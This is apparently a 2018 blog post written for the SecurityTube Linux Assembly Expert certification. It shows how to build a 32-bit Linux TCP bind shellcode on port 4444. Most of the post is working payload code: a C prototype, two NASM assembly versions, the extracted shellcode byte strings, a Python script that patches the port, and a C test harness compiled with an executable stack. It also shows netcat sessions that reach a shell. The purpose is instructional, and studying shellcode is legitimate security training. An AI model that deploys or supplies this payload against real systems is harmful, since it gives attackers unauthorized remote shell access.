---
layout: single
title: TCP bind shellcode
date: 2018-11-18
classes: wide
header:
  teaser: /assets/images/slae32.png
categories:
  - slae
  - infosec
tags:
  - slae
  - assembly
  - tcp bind shellcode
---
A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.

The shellcode does the following:
1. Creates a socket
2. Binds the socket to an IP address and port
3. Listens for incoming connections
4. Redirects STDIN, STDOUT and STDERR to the socket once a connection is made
5. Executes a shell

### C prototype
---------------
To better understand the process of creating a bind shellcode, I created a prototype in C that uses the same functions that'll be used in the assembly version. The full code is shown here. We'll walk through each section of the code after.

```c
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    // Create addr struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444); // Port
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on any interface

    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        perror("Socket creation failed.\n");
        exit(EXIT_FAILURE);
    }

    // Bind socket
    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
        perror("Socket bind failed.\n");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Listen for connection
    if (listen(sock, 0) == -1) {
        perror("Listen failed.\n");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Accept connection
    int fd = accept(sock, NULL, NULL);
    if (fd == -1) {
        perror("Socket accept failed.\n");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Duplicate stdin/stdout/stderr to socket
    dup2(fd, 0); // stdin
    dup2(fd, 1); // stdout
    dup2(fd, 2); // stderr

    // Execute shell
    execve("/bin/sh", NULL, NULL);
}
```

#### 1. Socket creation
```c
// Create socket
int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (sock == -1) {
    perror("Socket creation failed.\n");
    exit(EXIT_FAILURE);
}
```

The `socket` function requires 3 arguments:
- int `domain`: The domain is `AF_INET` here since we are going to use IPv4 instead of local sockets or IPv6.
- int `type`: For TCP sockets we use `SOCK_STREAM`. If we wanted to use UDP we'd use `SOCK_DGRAM` instead.
- int `protocol`: For `SOCK_STREAM`, there's a single protocol implemented, we could use 0 also here.

#### 2. Binding the socket
```c
// Create addr struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444); // Port
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on any interface

[...]

// Bind socket
if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
    perror("Socket bind failed.\n");
    close(sock);
    exit(EXIT_FAILURE);
}
```
A socket by itself doesn't do anything since we haven't associated the socket with any port or IP address. The `bind` function assigns the IP and port to the socket previously created. The man pages for `ip` explain the different parameters:

```c
struct sockaddr_in {
   sa_family_t    sin_family; /* address family: AF_INET */
   in_port_t      sin_port;   /* port in network byte order */
   struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
   uint32_t       s_addr;     /* address in network byte order */
};
```

In data networking, packets are transmitted in big-endian order (aka network byte order), so we use the `htons` and `htonl` function to convert the port and address to the right endianness. The `INADDR_ANY` is just a reference to NULL, so the program will bind to all interfaces on the machine. If we wanted to listen on a specific interface we would use the IP address of the interface here.

#### 3. Listen and Accept connections

```c
// Listen for connection
if (listen(sock, 0) == -1) {
    perror("Listen failed.\n");
    close(sock);
    exit(EXIT_FAILURE);
}

// Accept connection
int fd = accept(sock, NULL, NULL);
if (fd == -1) {
    perror("Socket accept failed.\n");
    close(sock);
    exit(EXIT_FAILURE);
}
```

The `listen` function tells the socket to listen for new connections. We can set the backlog to 0 since we only need to process a single connection request.

The `accept` function requires 3 arguments:
- int `sockfd`:  This is the value of the socket descriptor we created earlier
- struct `sockaddr *addr`: We can set this to NULL because we don't need to store the IP address of the connection host
- socklen_t `*addrlen`: Set to NULL because we're not using `addr`

The program now waits for incoming connection as this point. As indicated in the man page:

> If no pending connections are present on the queue, and the socket is not marked as nonblocking, accept() blocks the caller until a connection is present.

When the connection is received, the `accept` function will return the descriptor of the connection which we'll use to redirected IO to.

#### 4. Duplicate file descriptors

```c
    // Duplicate stdin/stdout/stderr to socket
    dup2(fd, 0); //stdin
    dup2(fd, 1); //stdout
    dup2(fd, 2); //stderr
```

Before the shell is executed, the file descriptors for stdin, stdout and stderr are duplicated to the descriptor of the TCP connection. This is necessary to redirect input and output from the executed process to the network socket.

#### 5. Execute shell

```c
// Execute shell
execve("/bin/sh", NULL, NULL);
```

`execve`  does not start a new process but instead replaces the current program with a new one. Here the `/bin/sh` shell binary is used without any arguments passed to it. If we wanted to use another binary with command line arguments or environment variables, we'd pass those using the 2nd and 3rd arguments.

#### Testing the program

The code is compiled as follows:
```
slemire@slae:~/slae32/assignment1$ gcc -o shell_bind_tcp_c shell_bind_tcp.c
shell_bind_tcp.c: In function ‘main’:
shell_bind_tcp.c:50:2: warning: null argument where non-null required (argument 2) [-Wnonnull]
  execve("/bin/sh", NULL, NULL);
  ^
```

The compiler gives a warning because we're using a NULL value instead of pointing to an array of strings but the code still works.

Now it's time to test it, :
```
[In the first terminal session]
slemire@slae:~/slae32/assignment1$ ./shell_bind_tcp
...
[Using another terminal session]
slemire@slae:~$ nc -nv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

`ltrace` can be used to record dynamic library calls made during the execution of the program. We can see both file descriptors created: `fd 4` is the one created when the connection is accepted, and is the one used to redirect the input & output to.
```console
slemire@supersnake:~/slae32/assignment1$ ltrace ./shell_bind_tcp_c
__libc_start_main(0x804864b, 1, 0xbffff6b4, 0x80487f0 <unfinished ...>
htons(4444, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                        = 0x5c11
htonl(0, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                           = 0
socket(2, 1, 6)                                                                                                        = 3
bind(3, 0xbffff5ec, 16, 0xb7e320ec)                                                                                    = 0
listen(3, 0, 16, 0xb7e320ec)                                                                                           = 0
accept(3, 0, 0, 0xb7e320ec)                                                                                            = 4
dup2(4, 0)                                                                                                             = 0
dup2(4, 1)                                                                                                             = 1
dup2(4, 2)                                                                                                             = 2
execve(0x80488c5, 0, 0, 0xb7e320ec <no return ...>
--- Called exec() ---
```

### Assembly version
--------------------
The assembly version follows the same logic flow previously used in the C protoype. First, registers are cleared to make sure there are no unintended side effects when testing the shellcode within the `shellcode.c` skeleton program. Initially, when I tested the code and didn't clear out all registers, the ELF binary created by NASM worked ok but the shellcode inside the skeleton program crashed because EAX already had a value in the upper half of the register.

```nasm
; Zero registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

For this shellcode version, I used the initial syscall used in earlier Linux versions where a single syscall was used to control all socket functions on the kernel. Newer Linux versions implement separate syscalls as indicated in the `socketcall` man page:

>On a some architectures—for example, x86-64 and ARM—there is no
socketcall() system call; instead socket(2), accept(2), bind(2), and
so on really are implemented as separate system calls.
>
>On x86-32, socketcall() was historically the only entry point for the
sockets API.  However, starting in Linux 4.3, direct system calls are
provided on x86-32 for the sockets API.

```int socketcall(int call, unsigned long *args);```

`sys_socketcall` works a bit differently than other syscalls. The first argument (EBX register) contains the function name being called and the 2nd argument in ECX contains a pointer to a memory address containing the various arguments for the function.

`/usr/include/linux/net.h` contains the following list of function calls:

```c
#define SYS_SOCKET  1       /* sys_socket(2)        */
#define SYS_BIND    2       /* sys_bind(2)          */
#define SYS_CONNECT 3       /* sys_connect(2)       */
#define SYS_LISTEN  4       /* sys_listen(2)        */
#define SYS_ACCEPT  5       /* sys_accept(2)        */
...
```

Let's take the socket creation as an example:

```nasm
; Create socket
mov al, 0x66        ; sys_socketcall
mov bl, 0x1         ;   SYS_SOCKET
push 0x6            ; int protocol -> IPPROTO_TCP
push 0x1            ; int type -> SOCK_STREAM
push 0x2            ; int domain -> AF_INET
mov ecx, esp
int 0x80            ; sys_socketcall (SYS_SOCKET)
mov edi, eax        ; save socket fd
```

`EAX` contains `0x66` which is `sys_socketcall`, then EBX is set to `0x1` (SYS_SOCKET). Next the arguments for `socket()` itself are pushed on the stack then the value of the stack frame pointer is moved into `ECX`. When the function call returns, the descriptor value is saved into `EDI` so it can be used later.

The sockaddr_in struct is created as follows:

```nasm
; Create addr struct
push edx            ; NULL padding
push edx            ; NULL padding
push edx            ; sin.addr (0.0.0.0)
push word 0x5c11    ; Port
push word 0x2       ; AF_INET
mov esi, esp
```

Since the addr struct needs to be 16 bytes, `$edx` is pushed twice to add 8 bytes of null padding. `$edx` is pushed a third time to define the listening address for the socket and finally the port number is pushed followed by the domain value for `AF_INET`.

For `bind`, we push the size of the addr struct (16 bytes), then its address which we saved to the `$esi` register earlier and the socket description from `$edi`.

```nasm
; Bind socket
mov al, 0x66        ; sys_socketcall
mov bl, 0x2         ;   SYS_BIND
push 0x10           ; socklen_t addrlen
push esi            ; const struct sockaddr *addr
push edi            ; int sockfd -> saved socket fd
mov ecx, esp
int 0x80            ; sys_socketcall (SYS_BIND)
```

The `listen` and `accept` functions work the same way with the arguments being pushed on the stack and using `sys_socketcall`.

```nasm
; Listen for connection
mov al, 0x66        ; sys_socketcall
mov bl, 0x4         ;   SYS_LISTEN
push edx            ; int backlog -> NULL
push edi            ; int sockfd -> saved socket fd
mov ecx, esp
int 0x80            ; sys_socketcall (SYS_LISTEN)

; Accept connection
mov al, 0x66        ; sys_socketcall
mov bl, 0x5         ;   SYS_ACCEPT
push edx            ; socklen_t *addrlen -> NULL
push edx            ; struct sockaddr *addr -> NULL
push edi            ; int sockfd -> saved sock fd value
mov ecx, esp
int 0x80            ; sys_socketcall (SYS_ACCEPT)
```

To redirect IO to the descriptor, a loop with the `$ecx` register is used. Because of the way the loop instruction works (it exits when `$ecx` is 0), the `dec` and `inc` instruction are used here so we can still use the `$ecx` value to call `dup2`.

```nasm
; Redirect STDIN, STDOUT, STDERR to socket
xor ecx, ecx
mov cl, 0x3         ; counter for loop (stdin to stderr)
mov ebx, edi        ; socket fd

dup2:
mov al, 0x3f        ; sys_dup2
dec ecx
int 0x80            ; sys_dup2
inc ecx
loop dup2
```

The `/bin/bash` program is used to spawn a shell, padding it with forward slashes so it is 4 bytes aligned. Because the string needs to be null-terminated, an garbage character (`A`) is added to string and is changed to a NULL with the subsequent `mov byte [esp + 11], al` instruction.

```nasm
; execve()
xor eax, eax
push 0x41687361     ; ///bin/bashA
push 0x622f6e69
push 0x622f2f2f
mov byte [esp + 11], al ; NULL terminate string
mov al, 0xb         ; sys_execve
mov ebx, esp        ; const char *filename
xor ecx, ecx        ; char *const argv[]
xor edx, edx        ; char *const envp[]
int 0x80            ; sys_execve
```

The final assembly code looks like this:

```nasm
global _start

section .text

_start:

    ; Zero registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; Create socket
    mov al, 0x66        ; sys_socketcall
    mov bl, 0x1         ;   SYS_SOCKET
    push 0x6            ; int protocol -> IPPROTO_TCP
    push 0x1            ; int type -> SOCK_STREAM
    push 0x2            ; int domain -> AF_INET
    mov ecx, esp
    int 0x80            ; sys_socketcall (SYS_SOCKET)
    mov edi, eax        ; save socket fd

    ; Create addr struct
    push edx            ; NULL padding
    push edx            ; NULL padding
    push edx            ; sin.addr (0.0.0.0)
    push word 0x5c11    ; Port
    push word 0x2       ; AF_INET
    mov esi, esp

    ; Bind socket
    mov al, 0x66        ; sys_socketcall
    mov bl, 0x2         ;   SYS_BIND
    push 0x10           ; socklen_t addrlen
    push esi            ; const struct sockaddr *addr
    push edi            ; int sockfd -> saved socket fd
    mov ecx, esp
    int 0x80            ; sys_socketcall (SYS_BIND)

    ; Listen for connection
    mov al, 0x66        ; sys_socketcall
    mov bl, 0x4         ;   SYS_LISTEN
    push edx            ; int backlog -> NULL
    push edi            ; int sockfd -> saved socket fd
    mov ecx, esp
    int 0x80            ; sys_socketcall (SYS_LISTEN)

    ; Accept connection
    mov al, 0x66        ; sys_socketcall
    mov bl, 0x5         ;   SYS_ACCEPT
    push edx            ; socklen_t *addrlen -> NULL
    push edx            ; struct sockaddr *addr -> NULL
    push edi            ; int sockfd -> saved sock fd value
    mov ecx, esp
    int 0x80            ; sys_socketcall (SYS_ACCEPT)
    mov edi, eax

    ; Redirect STDIN, STDOUT, STDERR to socket
    xor ecx, ecx
    mov cl, 0x3         ; counter for loop (stdin to stderr)
    mov ebx, edi        ; socket fd

    dup2:
    mov al, 0x3f        ; sys_dup2
    dec ecx
    int 0x80            ; sys_dup2
    inc ecx
    loop dup2

    ; execve()
    xor eax, eax
    push 0x41687361     ; ///bin/bashA
    push 0x622f6e69
    push 0x622f2f2f
    mov byte [esp + 11], al ; NULL terminate string
    mov al, 0xb         ; sys_execve
    mov ebx, esp        ; const char *filename
    xor ecx, ecx        ; char *const argv[]
    xor edx, edx        ; char *const envp[]
    int 0x80            ; sys_execve
```

Compiling and linking the code...
```console
slemire@slae:~/slae32/assignment1$ ../compile.sh shell_bind_tcp
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Shellcode: \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
[+] Length: 116
[+] Done!
```

Testing the ELF binary generated by NASM:
```console
slemire@slae:~/slae32/assignment1$ file shell_bind_tcp
shell_bind_tcp: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
[...]
slemire@slae:~/slae32/assignment1$ ./shell_bind_tcp
[...]
slemire@slae:~$ nc -nv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

The `shellcode.c` program is then used to test the shellcode as it would used in an actual exploit:
```c
#include <stdio.h>

char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

int main()
{
    int (*ret)() = (int(*)())shellcode;
    printf("Size: %d bytes.\n", sizeof(shellcode));
    ret();
}
```

The test program is compiled and tested:

```
slemire@slae:~/slae32/assignment1$ gcc -o shellcode -fno-stack-protector -z execstack shellcode.c    
slemire@slae:~/slae32/assignment1$ ./shellcode
[...]
slemire@slae:~$ nc -nv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
whoami
slemire
```

### 2nd version using syscalls
------------------------------
The 2nd version of this bind shellcode uses the new syscalls. According to the following [kernel patch](https://patchwork.kernel.org/patch/146431/), sometimes in 2010 they added new syscall entries for non-multiplexed socket calls.

The ones that interest us are:

```c
#define __NR_socket 359
#define __NR_bind 361
#define __NR_connect 362
#define __NR_listen 363
#define __NR_accept4 364
```

Instead of using `sys_socketcall`, we can use those syscalls directly and put the arguments in the registers. The same code flow is used but the arguments are passed differently.

The second version of the shellcode looks like this:

```nasm
global _start

section .text

_start:

    ; Zero registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; Create socket
    mov ax, 0x167       ; sys_socket
    mov bl, 0x2         ; int domain -> AF_INET
    inc ecx             ; int type -> SOCK_STREAM
    mov dl, 0x6         ; int protocol -> IPPROTO_TCP
    int 0x80            ; sys_socket
    mov edi, eax        ; save socket fd

    ; Create addr struct
    xor edx, edx
    push edx            ; NULL padding
    push edx            ; NULL padding
    push edx            ; sin.addr (0.0.0.0)
    push word 0x5c11    ; Port
    push word 0x2       ; AF_INET
    mov esi, esp

    ; Bind socket
    mov ax, 0x169       ; sys_bind
    mov ebx, edi        ; int sockfd -> saved socket fd
    mov ecx, esi        ; const struct sockaddr *addr
    mov dl, 0x10        ; socklen_t addrlen
    int 0x80            ; sys_bind

    ; Listen for connection
    mov ax, 0x16b       ; sys_listen
    mov ebx, edi        ; int sockfd -> saved socket fd
    xor ecx, ecx        ; int backlog -> NULL
    int 0x80            ; sys_socketcall (SYS_LISTEN)

    ; Accept connection
    mov ax, 0x16c       ; sys_accept4
    mov ebx, edi        ; int sockfd -> saved sock fd value
    xor ecx, ecx        ; struct sockaddr *addr -> NULL
    xor edx, edx        ; socklen_t *addrlen -> NULL
    xor esi, esi
    int 0x80            ; sys_socketcall (SYS_ACCEPT)
    mov edi, eax        ; save the new fd

    ; Redirect STDIN, STDOUT, STDERR to socket
    xor ecx, ecx
    mov cl, 0x3         ; counter for loop (stdin to stderr)
    mov ebx, edi        ; socket fd

    dup2:
    mov al, 0x3f        ; sys_dup2
    dec ecx
    int 0x80            ; sys_dup2
    inc ecx
    loop dup2

    ; execve()
    xor eax, eax
    push 0x41687361     ; ///bin/bashA
    push 0x622f6e69
    push 0x622f2f2f
    mov byte [esp + 11], al ; NULL terminate string
    mov al, 0xb         ; sys_execve
    mov ebx, esp        ; const char *filename
    xor ecx, ecx        ; char *const argv[]
    xor edx, edx        ; char *const envp[]
    int 0x80            ; sys_execve
```

If we want to change the listening port, we can modify the assembly code and re-compile it but instead it would be more convenient to use a small python script that will automatically replace the port in the shellcode.

The following script replaces the hardcoded port `4444` from the shellcode with the port supplied at the command line. The script also gives a warning if any null bytes are contained in the modified shellcode. Depending on which port is being used, it's possible some values may generate null bytes.

```python
#!/usr/bin/python

import socket
import sys

shellcode =  '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01'
shellcode += '\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52\\x52\\x66\\x68\\x11\\x5c\\x66'
shellcode += '\\x6a\\x02\\x89\\xe6\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80'
shellcode += '\\xb0\\x66\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52'
shellcode += '\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x89\\xfb\\xb0\\x3f\\x49'
shellcode += '\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0\\x68\\x61\\x73\\x68\\x41\\x68\\x69\\x6e\\x2f'
shellcode += '\\x62\\x68\\x2f\\x2f\\x2f\\x62\\x88\\x44\\x24\\x0b\\xb0\\x0b\\x89\\xe3\\x31\\xc9'
shellcode += '\\x31\\xd2\\xcd\\x80'

if len(sys.argv) < 2:
    print('Usage: {name} [port]'.format(name = sys.argv[0]))
    exit(1)

port = sys.argv[1]
port_htons = hex(socket.htons(int(port)))

byte1 = port_htons[4:]
if byte1 == '':
    byte1 = '0'
byte2 = port_htons[2:4]
shellcode = shellcode.replace('\\x11\\x5c', '\\x{}\\x{}'.format(byte1, byte2))

print('Here\'s the shellcode using port {port}:'.format(port = port))
print(shellcode)

if '\\x0\\' in shellcode or '\\x00\\' in shellcode:
    print('##################################')
    print('Warning: Null byte in shellcode!')
    print('##################################')
```

Here's the script in action:
```
slemire@slae:~/slae32/assignment1$ ./prepare.py 5555
Here's the shellcode using port 5555:
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
```

The shellcode is then added to the test program.
```c
#include <stdio.h>

char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

int main()
{
        int (*ret)() = (int(*)())shellcode;
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        ret();
}
```

```
slemire@slae:~$ gcc -o test -fno-stack-protector -z execstack shellcode.c 
slemire@slae:~$ ./test
[...]
slemire@slae:~$ nc -nv 127.0.0.1 5555
Connection to 127.0.0.1 5555 port [tcp/*] succeeded!
whoami
slemire
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1236

All source files can be found on GitHub at [https://github.com/slemire/slae32](https://github.com/slemire/slae32)